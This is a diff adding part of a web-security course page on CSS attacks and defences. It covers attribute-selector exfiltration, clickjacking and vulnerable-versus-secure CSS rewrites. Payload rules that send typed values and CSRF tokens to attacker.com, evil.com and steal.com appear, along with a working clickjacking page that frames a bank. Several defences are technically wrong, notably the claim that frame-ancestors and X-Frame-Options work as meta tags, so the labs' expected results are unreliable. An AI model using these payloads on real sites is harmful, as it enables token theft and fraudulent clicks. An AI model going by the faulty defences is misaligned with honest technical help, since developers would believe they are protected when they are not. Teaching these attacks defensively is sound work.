+<span class="sel">input</span>[<span class="prop">value</span>^=<span class="val">"c"</span>] { <span class="prop">background-image</span>: <span class="val">url("https://attacker.com/log?char=c")</span>; }
+<span class="cmt">/* ... and so on for every letter, digit, and symbol */</span>
+
+<span class="cmt">/* As the user types each character, the matching rule fires a request.
+   The attacker's server logs the requests and reconstructs what was typed.
+   ⚠️  This requires NO JavaScript — pure CSS only. */</span>
+
+<span class="cmt">/* ── PREVENTION ──────────────────────────────────────────────────── */</span>
+<span class="cmt">/* 1. Never allow user-controlled CSS on your page (server sanitisation) */</span>
+<span class="cmt">/* 2. Add a Content Security Policy that blocks external style-src requests */</span>
+<span class="cmt">/*    (see CSP examples in Lab 3) */</span>
+<span class="cmt">/* 3. Password inputs are SAFE — browsers do not expose the value attribute
+      of &lt;input type="password"&gt; to CSS selectors */</span>
+</div>
+
+<p><strong>Attack 3 — Attribute Selector Exfiltration: Stealing CSRF Tokens</strong></p>
+
+<div class="code-block"><span class="cmt">/* ── THE VULNERABLE HTML ─────────────────────────────────────────── */</span>
+<span class="cmt">/* A hidden CSRF token stored in an attribute — readable by CSS */</span>
+&lt;input <span class="prop">type</span>=<span class="val">"hidden"</span> <span class="prop">name</span>=<span class="val">"csrf_token"</span> <span class="prop">value</span>=<span class="val">"a7f3..."</span>&gt;
+
+<span class="cmt">/* ── THE ATTACK CSS ──────────────────────────────────────────────── */</span>
+<span class="cmt">/* Attacker injects one rule per possible starting character: */</span>
+<span class="sel">input</span>[<span class="prop">name</span>=<span class="val">"csrf_token"</span>][<span class="prop">value</span>^=<span class="val">"a"</span>] {
+  <span class="prop">background-image</span>: <span class="val">url("https://attacker.com/?token_starts=a")</span>;
+}
+<span class="cmt">/* The browser matches the rule and fires the request.
+   Attacker knows the first character is 'a'.
+   Repeat for next character: value^="a7" → confirms second char is '7'
+   Repeat until full token is reconstructed. */</span>
+
+<span class="cmt">/* ── SECURE ALTERNATIVE ──────────────────────────────────────────── */</span>
+<span class="cmt">/* Store CSRF tokens in JavaScript variables or HTTP-only cookies —
+   neither is accessible to CSS attribute selectors */</span>
+
+<span class="cmt">/* In JavaScript (accessible to JS, not to CSS): */</span>
+<span class="bad">const csrfToken = document.querySelector('[name=csrf_token]').value; // ← in HTML attr, CSS can see it</span>
+
+<span class="good">// ✓ Better: embed in a meta tag only readable by JS</span>
+&lt;meta <span class="prop">name</span>=<span class="val">"csrf-token"</span> <span class="prop">content</span>=<span class="val">"a7f3..."</span>&gt;
+<span class="good">// CSS cannot target meta[name="csrf-token"][content^="a"] in most browsers,
+// and a strict CSP blocks any exfiltration request anyway</span>
+</div>
+
+<div class="box-red">
+  <strong>Key Principle:</strong> CSS is a data channel. Any CSS property that can trigger an HTTP request — <code>background-image</code>, <code>list-style-image</code>, <code>cursor</code>, <code>@font-face src</code> — becomes an exfiltration vector if an attacker can control the URL. Preventing user-controlled CSS from reaching the page and enforcing a strict Content Security Policy are the two defences.
+</div>
+
+<!-- ─────────────────── 2.2 ─────────────────── -->
+<h4 class="topic-heading">2.2 — Clickjacking and UI Redressing <span class="duration">40 min</span></h4>
+
+<div class="objective-box">
+  <div class="obj-title">🎯 Objective</div>
+  <p style="margin:4px 0;">Students can explain the exact CSS mechanism behind a clickjacking attack, describe its three main variants, and implement all four prevention layers: CSP <code>frame-ancestors</code>, <code>X-Frame-Options</code>, JavaScript frame-busting, and CSS visual indicators.</p>
+</div>
+
+<div class="how-box">
+  <strong>How it is achieved:</strong> The instructor builds the attack page live — a visible fake button under a transparent iframe — so students see every CSS property in use. Then all four prevention layers are added one at a time and tested. Students follow along and see each defence refuse the embed.
+</div>
+
+<p><strong>How Clickjacking Works — the CSS Mechanism:</strong></p>
+
+<div class="code-block"><span class="cmt">/* ── THE ATTACKER'S PAGE — sets up the invisible iframe trap ────── */</span>
+
+<span class="cmt">/* Attacker's HTML: */</span>
+&lt;div <span class="prop">class</span>=<span class="val">"wrapper"</span>&gt;
+
+  <span class="cmt">&lt;!-- The real target site — invisible but receiving clicks --&gt;</span>
+  &lt;iframe <span class="prop">src</span>=<span class="val">"https://victim-bank.com/transfer"</span>
+          <span class="prop">class</span>=<span class="val">"invisible-frame"</span>&gt;&lt;/iframe&gt;
+
+  <span class="cmt">&lt;!-- The fake button the user actually sees --&gt;</span>
+  &lt;button <span class="prop">class</span>=<span class="val">"decoy-button"</span>&gt;🎁 Click to Claim Your Prize!&lt;/button&gt;
+
+&lt;/div&gt;
+
+<span class="cmt">/* Attacker's CSS: */</span>
+<span class="sel">.wrapper</span> {
+  <span class="prop">position</span>: <span class="val">relative</span>;
+  <span class="prop">width</span>:    <span class="val">300px</span>;
+  <span class="prop">height</span>:   <span class="val">60px</span>;
+}
+
+<span class="sel">.invisible-frame</span> {
+  <span class="prop">position</span>: <span class="val">absolute</span>;
+  <span class="prop">top</span>:      <span class="val">0</span>;
+  <span class="prop">left</span>:     <span class="val">0</span>;
+  <span class="prop">width</span>:    <span class="val">100%</span>;
+  <span class="prop">height</span>:   <span class="val">100%</span>;
+  <span class="prop">opacity</span>:  <span class="val">0.01</span>;    <span class="cmt">/* ← nearly invisible but still receives clicks */</span>
+  <span class="prop">z-index</span>:  <span class="val">999</span>;     <span class="cmt">/* ← sits above the visible fake button */</span>
+  <span class="prop">border</span>:   <span class="val">none</span>;
+}
+
+<span class="sel">.decoy-button</span> {
+  <span class="prop">position</span>: <span class="val">absolute</span>;
+  <span class="prop">top</span>:      <span class="val">0</span>;
+  <span class="prop">left</span>:     <span class="val">0</span>;
+  <span class="prop">width</span>:    <span class="val">100%</span>;
+  <span class="prop">height</span>:   <span class="val">100%</span>;
+  <span class="prop">z-index</span>:  <span class="val">1</span>;       <span class="cmt">/* ← BELOW the invisible iframe */</span>
+}
+
+<span class="cmt">/* User sees: 🎁 Click to Claim Your Prize!
+   User clicks — the invisible iframe intercepts the click
+   The click registers on the bank's Confirm Transfer button
+   User sees: nothing changed — but the transfer happened */</span>
+</div>
+
+<p><strong>Prevention — All Four Layers Together:</strong></p>
+
+<div class="code-block"><span class="cmt">/* ════════════════════════════════════════════════════════════════
+   LAYER 1 — Content Security Policy: frame-ancestors  (PRIMARY)
+   Set as an HTTP response header — strongest defence
+   ════════════════════════════════════════════════════════════════ */</span>
+
+<span class="cmt">/* In your web server config or server-side code: */</span>
+<span class="good">Content-Security-Policy: frame-ancestors 'none'</span>
+<span class="cmt">/* 'none'  — no one may embed this page in an iframe */</span>
+<span class="cmt">/* 'self'  — only the same origin may embed it        */</span>
+<span class="cmt">/* "https://trusted.com" — only that specific domain  */</span>
+
+<span class="cmt">/* If you can only use HTML (no server config access): */</span>
+&lt;meta <span class="prop">http-equiv</span>=<span class="val">"Content-Security-Policy"</span>
+      <span class="prop">content</span>=<span class="val">"frame-ancestors 'none'"</span>&gt;
+<span class="cmt">/* Note: meta tag CSP is weaker — the HTTP header is always preferred */</span>
+
+
+<span class="cmt">/* ════════════════════════════════════════════════════════════════
+   LAYER 2 — X-Frame-Options  (backward compatibility)
+   ════════════════════════════════════════════════════════════════ */</span>
+
+<span class="cmt">/* HTTP header — works in older browsers that predate CSP: */</span>
+<span class="good">X-Frame-Options: DENY</span>
+<span class="cmt">/* DENY       — blocks all framing */</span>
+<span class="cmt">/* SAMEORIGIN — allows same-origin framing only */</span>
+
+<span class="cmt">/* As a meta tag: */</span>
+&lt;meta <span class="prop">http-equiv</span>=<span class="val">"X-Frame-Options"</span> <span class="prop">content</span>=<span class="val">"DENY"</span>&gt;
+
+
+<span class="cmt">/* ════════════════════════════════════════════════════════════════
+   LAYER 3 — JavaScript Frame-Busting
+   ════════════════════════════════════════════════════════════════ */</span>
+
+<span class="cmt">/* Add to the &lt;head&gt; of every protected page */</span>
+&lt;script&gt;
+  <span class="cmt">// If this page is inside an iframe, escape immediately</span>
+  <span class="good">if (window !== window.top) {</span>
+    <span class="good">  window.top.location = window.location.href;</span>
+    <span class="good">}</span>
+&lt;/script&gt;
+
+<span class="cmt">/* Limitation: the iframe's sandbox attribute can block this.
+   This is why frame-busting is a supporting layer, not the primary defence. */</span>
+
+
+<span class="cmt">/* ════════════════════════════════════════════════════════════════
+   LAYER 4 — CSS Visual Warning Indicators
+   ════════════════════════════════════════════════════════════════ */</span>
+
+<span class="cmt">/* A JavaScript block adds the "framed" class if inside an iframe.
+   CSS then displays a visible warning banner. */</span>
+
+&lt;script&gt;
+  <span class="good">if (window !== window.top) {</span>
+  <span class="good">  document.body.classList.add('is-framed');</span>
+  <span class="good">  }</span>
+&lt;/script&gt;
+
+<span class="cmt">/* In CSS: */</span>
+<span class="sel">body.is-framed::before</span> {
+  <span class="prop">content</span>:    <span class="val">"⚠️ WARNING: This page is being displayed inside another website."</span>;
+  <span class="prop">display</span>:    <span class="val">block</span>;
+  <span class="prop">position</span>:   <span class="val">fixed</span>;
+  <span class="prop">top</span>:        <span class="val">0</span>;
+  <span class="prop">left</span>:       <span class="val">0</span>;
+  <span class="prop">right</span>:      <span class="val">0</span>;
+  <span class="prop">padding</span>:    <span class="val">14px 20px</span>;
+  <span class="prop">background</span>: <span class="val">#C62828</span>;
+  <span class="prop">color</span>:      <span class="val">white</span>;
+  <span class="prop">font-size</span>:  <span class="val">1rem</span>;
+  <span class="prop">font-weight</span>:<span class="val">bold</span>;
+  <span class="prop">text-align</span>: <span class="val">center</span>;
+  <span class="prop">z-index</span>:    <span class="val">99999</span>;
+}
+
+<span class="sel">html.is-framed</span> {
+  <span class="prop">border</span>: <span class="val">6px solid #C62828</span>;  <span class="cmt">/* red border around entire page */</span>
+}
+</div>
+
+<div class="box-red">
+  <strong>Defence-in-Depth Summary:</strong> No single layer is enough alone. Use all four together: (1) <code>frame-ancestors 'none'</code> as the primary blocker; (2) <code>X-Frame-Options: DENY</code> for older browser compatibility; (3) JavaScript frame-busting as an additional runtime check; (4) CSS visual warning banner as a last-resort user-facing alert. Lab 4 implements and tests all four on a real page.
+</div>
+
+<!-- ───────────────────────────────────────────
+     LAB 3
+     ─────────────────────────────────────────── -->
+<h3 class="session-heading">Lab 3 — Build a Secure Product Page <span class="duration">3 Hours</span></h3>
+
+<div class="objective-box">
+  <div class="obj-title">🎯 Lab 3 Objective</div>
+  <p style="margin:4px 0;">Build a professional product page for a fictional secure laptop from scratch — no starter code. Security headers must be the first things added to the HTML head. The page demonstrates Flexbox and Grid layout skills from Day 1 applied to a more complex, realistic structure, and includes all security configurations from the Day 2 theory.</p>
+</div>
+
+<div class="step-block">
+  <div class="step-label">Part A — Security First: Headers Before Anything Else (30 min)</div>
+  <p>Create <code>product.html</code> and <code>product-styles.css</code>. Before adding a single visible element, add all security headers. This order is intentional — security is configured before content is built, not bolted on at the end.</p>
+
+<div class="code-block"><span class="cmt">&lt;!-- product.html — SECURITY HEADERS FIRST ────────────────────── --&gt;</span>
+&lt;!DOCTYPE html&gt;
+&lt;html lang=<span class="val">"en"</span>&gt;
+&lt;head&gt;
+  &lt;meta charset=<span class="val">"UTF-8"</span>&gt;
+  &lt;meta name=<span class="val">"viewport"</span> content=<span class="val">"width=device-width, initial-scale=1"</span>&gt;
+
+  <span class="cmt">&lt;!-- ✅ SECURITY — added FIRST, before any CSS or content ──── --&gt;</span>
+
+  <span class="cmt">&lt;!-- Layer 1: CSP — blocks framing and restricts resource origins --&gt;</span>
+  &lt;meta http-equiv=<span class="val">"Content-Security-Policy"</span>
+    content=<span class="val">"
+      frame-ancestors 'none';
+      default-src 'self';
+      script-src 'self';
+      style-src 'self' 'unsafe-inline';
+      img-src 'self' data:;
+      font-src 'self' https://fonts.gstatic.com;
+    "</span>&gt;
+
+  <span class="cmt">&lt;!-- Layer 2: X-Frame-Options — backward compatibility --&gt;</span>
+  &lt;meta http-equiv=<span class="val">"X-Frame-Options"</span> content=<span class="val">"DENY"</span>&gt;
+
+  <span class="cmt">&lt;!-- Layer 3: JavaScript frame-busting --&gt;</span>
+  &lt;script&gt;
+    if (window !== window.top) {
+      document.body.classList.add(<span class="val">'is-framed'</span>);
+      window.top.location.replace(window.location.href);
+    }
+  &lt;/script&gt;
+
+  &lt;title&gt;SecureBook Pro — Security-First Laptop&lt;/title&gt;
+  &lt;link rel=<span class="val">"stylesheet"</span> href=<span class="val">"product-styles.css"</span>&gt;
+&lt;/head&gt;
+</div>
+</div>
+
+<div class="step-block">
+  <div class="step-label">Part B — Hero Section with CSS Grid (45 min)</div>
+  <p>The product hero uses a two-column Grid — image gallery on the left, product details on the right. On mobile it collapses to a single column.</p>
+
+<div class="code-block"><span class="cmt">/* ── PRODUCT HERO — two-column Grid ─────────────────────────────── */</span>
+<span class="sel">.product-hero</span> {
+  <span class="prop">display</span>:               <span class="val">grid</span>;
+  <span class="prop">grid-template-columns</span>: <span class="val">1fr</span>;          <span class="cmt">/* single column on mobile */</span>
+  <span class="prop">gap</span>:                   <span class="val">32px</span>;
+  <span class="prop">padding</span>:               <span class="val">var(--space-xl) var(--space-lg)</span>;
+}
+
+<span class="atr">@media</span> (min-width: <span class="val">768px</span>) {
+  <span class="sel">.product-hero</span> {
+    <span class="prop">grid-template-columns</span>: <span class="val">1fr 1fr</span>;    <span class="cmt">/* two equal columns on tablet+ */</span>
+  }
+}
+
+<span class="cmt">/* Main product image */</span>
+<span class="sel">.product-main-image</span> {
+  <span class="prop">width</span>:         <span class="val">100%</span>;
+  <span class="prop">border-radius</span>: <span class="val">var(--border-radius)</span>;
+  <span class="prop">box-shadow</span>:    <span class="val">var(--shadow-md)</span>;
+}
+
+<span class="cmt">/* Thumbnail strip below main image */</span>
+<span class="sel">.thumbnail-row</span> {
+  <span class="prop">display</span>: <span class="val">flex</span>;
+  <span class="prop">gap</span>:     <span class="val">8px</span>;
+  <span class="prop">margin-top</span>: <span class="val">12px</span>;
+}
+
+<span class="sel">.thumbnail</span> {
+  <span class="prop">width</span>:         <span class="val">72px</span>;
+  <span class="prop">height</span>:        <span class="val">72px</span>;
+  <span class="prop">object-fit</span>:    <span class="val">cover</span>;
+  <span class="prop">border-radius</span>: <span class="val">4px</span>;
+  <span class="prop">border</span>:        <span class="val">2px solid transparent</span>;
+  <span class="prop">cursor</span>:        <span class="val">pointer</span>;
+  <span class="prop">transition</span>:    <span class="val">border-color 0.2s ease</span>;
+}
+
+<span class="sel">.thumbnail:hover,</span>
+<span class="sel">.thumbnail.active</span>  { <span class="prop">border-color</span>: <span class="val">var(--color-primary)</span>; }
+</div>
+</div>
+
+<div class="step-block">
+  <div class="step-label">Part C — Tabbed Content, Specs Table &amp; Related Products Grid (60 min)</div>
+
+<div class="code-block"><span class="cmt">/* ── TAB INTERFACE — CSS handles visibility, JS toggles class ───── */</span>
+<span class="sel">.tab-panel</span>          { <span class="prop">display</span>: <span class="val">none</span>; }          <span class="cmt">/* hidden by default */</span>
+<span class="sel">.tab-panel.active</span>   { <span class="prop">display</span>: <span class="val">block</span>; }         <span class="cmt">/* JS adds/removes "active" */</span>
+
+<span class="sel">.tab-btn</span>            { <span class="prop">background</span>: <span class="val">#E0E0E0</span>; <span class="prop">border</span>: <span class="val">none</span>; <span class="prop">padding</span>: <span class="val">10px 20px</span>; <span class="prop">cursor</span>: <span class="val">pointer</span>; }
+<span class="sel">.tab-btn.active</span>     { <span class="prop">background</span>: <span class="val">var(--color-primary)</span>; <span class="prop">color</span>: <span class="val">white</span>; }
+
+<span class="cmt">/* ── SPECIFICATIONS TABLE ────────────────────────────────────────── */</span>
+<span class="sel">table</span>    { <span class="prop">width</span>: <span class="val">100%</span>; <span class="prop">border-collapse</span>: <span class="val">collapse</span>; }
+
+<span class="sel">th</span> {
+  <span class="prop">background</span>:  <span class="val">var(--color-primary)</span>;
+  <span class="prop">color</span>:       <span class="val">white</span>;
+  <span class="prop">padding</span>:     <span class="val">12px 16px</span>;
+  <span class="prop">text-align</span>:  <span class="val">left</span>;
+}
+
+<span class="sel">td</span>       { <span class="prop">padding</span>: <span class="val">10px 16px</span>; <span class="prop">border-bottom</span>: <span class="val">1px solid #E0E0E0</span>; }
+
+<span class="cmt">/* Alternating row colours */</span>
+<span class="sel">tr:nth-child(even) td</span>  { <span class="prop">background</span>: <span class="val">#F5F7FA</span>; }
+<span class="sel">tr:hover td</span>             { <span class="prop">background</span>: <span class="val">#E8F4FD</span>; }
+
+<span class="cmt">/* ── RELATED PRODUCTS GRID ───────────────────────────────────────── */</span>
+<span class="sel">.related-grid</span> {
+  <span class="prop">display</span>:               <span class="val">grid</span>;
+  <span class="prop">grid-template-columns</span>: <span class="val">repeat(auto-fit, minmax(220px, 1fr))</span>;
+  <span class="prop">gap</span>:                   <span class="val">20px</span>;
+}
+</div>
+</div>
+
+<div class="step-block">
+  <div class="step-label">Part D — Footer with Four-Column Grid &amp; Final Security Checklist (45 min)</div>
+
+<div class="code-block"><span class="cmt">/* ── FOOTER GRID ─────────────────────────────────────────────────── */</span>
+<span class="sel">.footer-grid</span> {
+  <span class="prop">display</span>:               <span class="val">grid</span>;
+  <span class="prop">grid-template-columns</span>: <span class="val">1fr</span>;   <span class="cmt">/* single column on mobile */</span>
+  <span class="prop">gap</span>:                   <span class="val">32px</span>;
+}
+
+<span class="atr">@media</span> (min-width: <span class="val">768px</span>) {
+  <span class="sel">.footer-grid</span> { <span class="prop">grid-template-columns</span>: <span class="val">repeat(2, 1fr)</span>; }  <span class="cmt">/* 2 cols on tablet */</span>
+}
+
+<span class="atr">@media</span> (min-width: <span class="val">1024px</span>) {
+  <span class="sel">.footer-grid</span> { <span class="prop">grid-template-columns</span>: <span class="val">repeat(4, 1fr)</span>; }  <span class="cmt">/* 4 cols on desktop */</span>
+}
+
+<span class="cmt">/* All external links — always add security attributes */</span>
+<span class="cmt">/* HTML example: */</span>
+&lt;a <span class="prop">href</span>=<span class="val">"https://external-site.com"</span>
+   <span class="prop">rel</span>=<span class="val">"noopener noreferrer"</span>
+   <span class="prop">target</span>=<span class="val">"_blank"</span>&gt;Visit&lt;/a&gt;
+<span class="cmt">/* noopener  — prevents the new tab accessing window.opener */</span>
+<span class="cmt">/* noreferrer — stops the Referer header leaking the origin URL */</span>
+</div>
+
+  <p>Before finishing Lab 3, verify each item on the security checklist below:</p>
+
+  <div class="box-red">
+    <strong>Lab 3 Security Checklist — every item must pass:</strong>
+    <ul>
+      <li>CSP meta tag with <code>frame-ancestors 'none'</code> is the first tag in <code>&lt;head&gt;</code></li>
+      <li><code>X-Frame-Options: DENY</code> meta tag is present</li>
+      <li>JavaScript frame-busting script is in <code>&lt;head&gt;</code></li>
+      <li>All images have meaningful <code>alt</code> attributes (not empty, not "image")</li>
+      <li>No raw user-supplied strings are placed inside any CSS property</li>
+      <li>All external links have <code>rel="noopener noreferrer"</code></li>
+      <li>Page is responsive at 375px, 768px, 1024px, and 1440px</li>
+      <li>Table has correct <code>&lt;thead&gt;</code>, <code>&lt;tbody&gt;</code>, <code>&lt;th&gt;</code>, <code>&lt;td&gt;</code> structure</li>
+      <li>No heading levels are skipped (h1 → h2 → h3, never h1 → h3)</li>
+    </ul>
+  </div>
+</div>
+
+<!-- ───────────────────────────────────────────
+     LAB 4
+     ─────────────────────────────────────────── -->
+<h3 class="session-heading">Lab 4 — Implement CSS Security Features &amp; Clickjacking Assessment <span class="duration">4 Hours</span></h3>
+
+<div class="objective-box">
+  <div class="obj-title">🎯 Lab 4 Objective</div>
+  <p style="margin:4px 0;">Implement all four clickjacking defence layers on the product page, identify security vulnerabilities in four provided CSS scenarios and rewrite them securely, test ten real websites for clickjacking protection using an iframe test page, and write a structured vulnerability report documenting findings.</p>
+</div>
+
+<div class="step-block">
+  <div class="step-label">Part A — Clickjacking Protection &amp; CSS Visual Layer (90 min)</div>
+  <p>Verify the three header layers are already in the product page from Lab 3, then add Layer 4 — the CSS visual warning system — and test it with an iframe embed page.</p>
+
+<div class="code-block"><span class="cmt">/* ── LAYER 4: CSS VISUAL WARNING ─────────────────────────────────── */</span>
+<span class="cmt">/* product-styles.css — add these rules */</span>
+
+<span class="cmt">/* Warning banner — hidden by default, shown when .is-framed class is added */</span>
+<span class="sel">body.is-framed::before</span> {
+  <span class="prop">content</span>:    <span class="val">"⚠️ WARNING: This page appears inside another website. Do not enter any information."</span>;
+  <span class="prop">display</span>:    <span class="val">block</span>;
+  <span class="prop">position</span>:   <span class="val">fixed</span>;
+  <span class="prop">top</span>:        <span class="val">0</span>;
+  <span class="prop">left</span>:       <span class="val">0</span>;
+  <span class="prop">right</span>:      <span class="val">0</span>;
+  <span class="prop">padding</span>:    <span class="val">14px 24px</span>;
+  <span class="prop">background</span>: <span class="val">#C62828</span>;
+  <span class="prop">color</span>:      <span class="val">white</span>;
+  <span class="prop">font-size</span>:  <span class="val">1rem</span>;
+  <span class="prop">font-weight</span>:<span class="val">700</span>;
+  <span class="prop">text-align</span>: <span class="val">center</span>;
+  <span class="prop">z-index</span>:    <span class="val">99999</span>;
+}
+
+<span class="sel">html.is-framed</span> {
+  <span class="prop">outline</span>: <span class="val">6px solid #C62828</span>;
+}
+
+<span class="cmt">/* ── TEST PAGE — create test.html to embed and verify defences ───── */</span>
+<span class="cmt">&lt;!-- test.html --&gt;</span>
+&lt;!DOCTYPE html&gt;
+&lt;html&gt;
+&lt;head&gt;
+  &lt;title&gt;Clickjacking Test&lt;/title&gt;
+  &lt;style&gt;
+    <span class="sel">iframe</span> {
+      <span class="prop">width</span>:   <span class="val">100%</span>;
+      <span class="prop">height</span>:  <span class="val">600px</span>;
+      <span class="prop">border</span>:  <span class="val">4px solid red</span>;
+    }
+  &lt;/style&gt;
+&lt;/head&gt;
+&lt;body&gt;
+  &lt;h1&gt;Attempting to embed product.html&lt;/h1&gt;
+  &lt;iframe src=<span class="val">"product.html"</span>&gt;&lt;/iframe&gt;
+  &lt;p&gt;If protections work, the iframe above will be empty and DevTools
+     Console will show a CSP or X-Frame-Options refusal error.&lt;/p&gt;
+&lt;/body&gt;
+&lt;/html&gt;
+
+<span class="cmt">/* ── EXPECTED RESULT IN DEVTOOLS CONSOLE ─────────────────────────── */</span>
+<span class="bad">Refused to display 'http://localhost/product.html' in a frame because
+it set 'X-Frame-Options' to 'deny'.</span>
+<span class="cmt">/* or, if CSP fires first: */</span>
+<span class="bad">Refused to frame 'http://localhost/product.html' because an ancestor
+violates the following Content Security Policy directive:
+"frame-ancestors 'none'".</span>
+<span class="cmt">/* Either message confirms the protection is working ✓ */</span>
+</div>
+</div>
+
+<div class="step-block">
+  <div class="step-label">Part B — CSS Vulnerability Identification &amp; Secure Rewrite (90 min)</div>
+  <p>For each scenario below, students: (1) identify the vulnerability, (2) explain what an attacker could do with it, and (3) rewrite the code securely.</p>
+
+<p><strong>Scenario 1 — User-Controlled Background:</strong></p>
+<div class="compare-grid">
+  <div class="compare-bad">
+    <span class="compare-label label-bad">❌ VULNERABLE</span>
+    <pre><span style="color:#78909C">/* User submits a colour preference.
+   Dev puts it straight into CSS. */</span>
+
+<span style="color:#CE93D8">.user-profile</span> {
+  <span style="color:#CE93D8">background-color</span>: <span style="color:#EF9A9A">red; }
+body {
+  background: url(
+  http://evil.com/steal);
+}</span>
+<span style="color:#78909C">/* ↑ injected CSS executes */</span></pre>
+  </div>
+  <div class="compare-good">
+    <span class="compare-label label-good">✅ SECURE</span>
+    <pre><span style="color:#78909C">/* Whitelist on the server,
+   then use a CSS class — never
+   a raw value */</span>
+
+<span style="color:#80CBC4">const</span> SAFE = [
+  <span style="color:#A5D6A7">'theme-red'</span>,
+  <span style="color:#A5D6A7">'theme-blue'</span>,
+  <span style="color:#A5D6A7">'theme-green'</span>
+];
+<span style="color:#80CBC4">if</span> (!SAFE.includes(input))
+  <span style="color:#80CBC4">return</span> reject();
+
+<span style="color:#78909C">/* Apply class, never value */</span>
+&lt;div <span style="color:#CE93D8">class</span>=<span style="color:#A5D6A7">"theme-blue"</span>&gt;</pre>
+  </div>
+</div>
+
+<p style="margin-top:14px;"><strong>Scenario 2 — User-Supplied Background Image URL:</strong></p>
+<div class="compare-grid">
+  <div class="compare-bad">
+    <span class="compare-label label-bad">❌ VULNERABLE</span>
+    <pre><span style="color:#78909C">/* User provides any URL —
+   browser makes the request,
+   leaking IP and session data */</span>
+
+<span style="color:#CE93D8">.hero</span> {
+  <span style="color:#CE93D8">background-image</span>:
+    url(<span style="color:#EF9A9A">USER_URL_HERE</span>);
+}
+<span style="color:#78909C">/* Could be:
+   url(data:text/html,&lt;script&gt;...)
+   or a tracking server */</span></pre>
+  </div>
+  <div class="compare-good">
+    <span class="compare-label label-good">✅ SECURE</span>
+    <pre><span style="color:#78909C">/* Accept image uploads only.
+   Store server-side.
+   Use a server-relative path. */</span>
+
+<span style="color:#80CBC4">/* Server validates file type,
+   stores to /uploads/,
+   returns safe path */</span>
+
+<span style="color:#CE93D8">.hero</span> {
+  <span style="color:#CE93D8">background-image</span>:
+    url(<span style="color:#A5D6A7">'/uploads/user-123.jpg'</span>);
+}
+<span style="color:#78909C">/* Path is server-controlled */</span></pre>
+  </div>
+</div>
+
+<p style="margin-top:14px;"><strong>Scenario 3 — CSRF Token in HTML Attribute (CSS-accessible):</strong></p>
+<div class="compare-grid">
+  <div class="compare-bad">
+    <span class="compare-label label-bad">❌ VULNERABLE</span>
+    <pre><span style="color:#78909C">/* Token in value attribute —
+   CSS attribute selectors can
+   read it character by character */</span>
+
+&lt;input
+  type=<span style="color:#EF9A9A">"hidden"</span>
+  name=<span style="color:#EF9A9A">"csrf"</span>
+  value=<span style="color:#EF9A9A">"a7f3b2..."</span>&gt;
+
+<span style="color:#78909C">/* Injected CSS rule:
+input[value^="a7"] {
+  background:url(steal?t=a7)
+} → token stolen */</span></pre>
+  </div>
+  <div class="compare-good">
+    <span class="compare-label label-good">✅ SECURE</span>
+    <pre><span style="color:#78909C">/* Store in a meta tag —
+   read by JS only,
+   not by CSS attribute selectors
+   in modern browsers */</span>
+
+&lt;meta
+  name=<span style="color:#A5D6A7">"csrf-token"</span>
+  content=<span style="color:#A5D6A7">"a7f3b2..."</span>&gt;
+
+<span style="color:#78909C">/* JS reads it: */</span>
+<span style="color:#80CBC4">const</span> token = document
+  .querySelector(
+    <span style="color:#A5D6A7">'[name=csrf-token]'</span>)
+  .content;
+<span style="color:#78909C">/* + enforce strict CSP to
+   block exfiltration requests */</span></pre>
+  </div>
+</div>
+
+<p style="margin-top:14px;"><strong>Scenario 4 — Inline Style from URL Parameter:</strong></p>
+<div class="compare-grid">
+  <div class="compare-bad">
+    <span class="compare-label label-bad">❌ VULNERABLE</span>
+    <pre><span style="color:#78909C">/* URL: /page?colour=red
+   Dev reads param, inlines it */</span>
+
+<span style="color:#78909C">/* Server-side: */</span>
+&lt;button
+  style=<span style="color:#EF9A9A">"color:USER_COLOUR"</span>&gt;
+  Buy
+&lt;/button&gt;
+
+<span style="color:#78909C">/* Attack URL:
+?colour=red;background:url(
+http://steal.com/?c=...)</span>
+<span style="color:#78909C">→ exfiltration triggered */</span></pre>
+  </div>
+  <div class="compare-good">
+    <span class="compare-label label-good">✅ SECURE</span>
+    <pre><span style="color:#78909C">/* Validate against whitelist,
+   apply as a CSS class name */</span>
+
+<span style="color:#78909C">/* Server-side: */</span>
+<span style="color:#80CBC4">const</span> SAFE = [
+  <span style="color:#A5D6A7">'red'</span>,<span style="color:#A5D6A7">'blue'</span>,<span style="color:#A5D6A7">'green'</span>];
+
+<span style="color:#80CBC4">if</span> (!SAFE.includes(colour))
+  colour = <span style="color:#A5D6A7">'blue'</span>;
+
+&lt;button
+  class=<span style="color:#A5D6A7">"btn-${colour}"</span>&gt;
+  Buy
+&lt;/button&gt;
+
+<span style="color:#78909C">/* CSS class — never raw value */</span></pre>
+  </div>
+</div>
+
+  <div class="box-green" style="margin-top:14px;">
+    <strong>Pattern to Remember:</strong> Every vulnerability above has the same root cause — user-controlled data reaching a CSS value without validation. The fix is always the same: validate against a whitelist on the server, translate to a predefined CSS class name, and never write raw user input into any CSS property or attribute.
+  </div>
+</div>
+
+<div class="step-block">
+  <div class="step-label">Part C — Real-Site Clickjacking Assessment (60 min)</div>
+  <p>Create a simple iframe test page and test ten websites. Record findings in the table below. Students are expected to test: school website, two e-commerce sites, one banking or financial site, two government websites, and three of their own choice.</p>
+
+<div class="code-block"><span class="cmt">&lt;!-- iframe-tester.html — test each site by changing the src URL --&gt;</span>
+&lt;!DOCTYPE html&gt;
+&lt;html&gt;
+&lt;head&gt;
+  &lt;title&gt;Clickjacking Assessment Tool&lt;/title&gt;
+  &lt;style&gt;
+    <span class="sel">iframe</span> { <span class="prop">width</span>: <span class="val">100%</span>; <span class="prop">height</span>: <span class="val">500px</span>; <span class="prop">border</span>: <span class="val">3px solid #C62828</span>; }
+    <span class="sel">body</span>   { <span class="prop">font-family</span>: <span class="val">sans-serif</span>; <span class="prop">padding</span>: <span class="val">20px</span>; }
+  &lt;/style&gt;
+&lt;/head&gt;
+&lt;body&gt;
+  &lt;h1&gt;Clickjacking Tester&lt;/h1&gt;
+  &lt;p&gt;Change the src URL below to test each site.
+     Check DevTools Console for refusal errors.&lt;/p&gt;
+  &lt;iframe src=<span class="val">"https://CHANGE-THIS-URL.com"</span>&gt;&lt;/iframe&gt;
+&lt;/body&gt;
+&lt;/html&gt;
+
+<span class="cmt">/* ── HOW TO READ THE DEVTOOLS CONSOLE RESULTS ─────────────────── */</span>
+
+<span class="cmt">/* Protected by X-Frame-Options: */</span>
+<span class="bad">Refused to display '...' in a frame because it set
+'X-Frame-Options' to 'deny'.</span>
+
+<span class="cmt">/* Protected by CSP frame-ancestors: */</span>
+<span class="bad">Refused to frame '...' because an ancestor violates
+the Content Security Policy directive "frame-ancestors 'none'".</span>
+
+<span class="cmt">/* NOT protected — iframe loads content: */</span>
+<span class="good">No error in Console — page loads inside iframe → VULNERABLE</span>
